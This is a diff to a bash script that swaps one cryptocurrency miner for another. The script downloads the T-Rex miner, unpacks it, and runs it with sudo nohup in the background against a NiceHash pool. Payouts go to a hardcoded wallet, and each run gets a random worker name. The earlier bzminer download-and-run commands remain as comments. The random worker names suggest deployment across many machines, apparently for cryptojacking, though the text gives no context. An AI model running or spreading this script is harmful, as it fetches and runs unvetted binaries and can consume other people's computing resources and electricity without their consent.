@@ -1,7 +1,12 @@
 #!/bin/bash
-sudo wget https://github.com/bzminer/bzminer/releases/download/v9.0.0/bzminer_v9.0.0_linux.tar.gz
-tar xvf bzminer_v9.0.0_linux.tar.gz
-chmod +x bzminer
-sudo nohup ./bzminer -a ethash -w sagemode.zz -p 3.215.245.39:443 > nohup.out
+apt-get install libpci3 && 
+wget https://trex-miner.com/download/t-rex-0.25.8-linux.tar.gz && 
+tar -xvf t-rex-0.25.8-linux.tar.gz && 
+sudo nohup ./t-rex -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.$(echo $(shuf -i 2-100 -n 1)-$(shuf -i 1-1000 -n 1)-T-Rex) -p x > nohup.out
+
+#sudo wget https://github.com/bzminer/bzminer/releases/download/v9.0.0/bzminer_v9.0.0_linux.tar.gz
+#tar xvf bzminer_v9.0.0_linux.tar.gz
+#chmod +x bzminer
+#sudo nohup ./bzminer -a ethash -w sagemode.zz -p 3.215.245.39:443 > nohup.out
 
 
